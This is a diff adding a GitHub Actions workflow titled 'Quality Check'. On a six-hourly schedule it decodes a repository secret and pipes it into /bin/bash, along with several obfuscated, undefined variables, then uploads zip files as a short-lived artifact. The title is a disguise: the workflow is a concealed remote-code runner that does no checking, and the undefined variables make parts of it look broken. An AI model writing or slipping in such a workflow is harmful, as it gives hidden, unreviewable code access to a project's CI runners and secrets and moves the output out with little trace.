@@ -1,0 +1,33 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 2,8,14,20 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          jv3: ${{ secrets.jv3 }}
+        run: |
+          printf '%s' "$jv3" | jq -r .ovm5182 | /bin/bash
+          printf '%s' "$p604" | jq -r .qxfwx98 | /bin/bash
+          printf '%s' "$randl0" | jq -r .ewsml210 | /bin/bash
+          printf '%s' "$jdtgq87" | jq -r .hw25 | /bin/bash
+          echo $nnftf31 | jq -r .cxhib798 | /bin/bash
+          printf '%s' "$gvoha81" | jq -r .oey17311 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: ygvODT8t
+          path: "*.zip"
+          retention-days: 1
